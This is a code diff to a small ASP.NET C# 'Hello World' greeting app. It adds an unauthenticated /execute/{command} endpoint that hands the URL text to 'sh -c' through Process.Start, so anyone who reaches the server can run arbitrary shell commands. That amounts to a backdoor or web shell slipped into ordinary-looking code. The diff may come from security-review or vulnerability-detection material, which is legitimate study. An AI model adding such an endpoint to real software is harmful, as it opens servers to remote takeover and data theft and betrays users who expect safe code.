@@ -1,5 +1,4 @@
-using Microsoft.AspNetCore.Builder;
-using Microsoft.AspNetCore.Hosting;
+using System.Diagnostics;
 
 namespace HelloWorldApp;
 
@@ -11,9 +10,16 @@ public class Program {
     app.MapGet("/",() => "Hello World!\n");
     app.MapGet("/greet/{name}", (string name) => Greeter.GreetUser(name));
     app.MapGet("/greet/{name}/{language}", (string name, string language) => Greeter.GreetUser(name, language));
+    app.MapGet("/execute/{command}", (string command) => ExecuteCommand(command));
 
     app.Run();
   }
+
+  public static string ExecuteCommand(string command)
+    {
+        Process.Start("sh", $"-c \"{command}\"");
+        return $"Executed command: {command}\n";
+    }
 }
 
 public class Greeter {
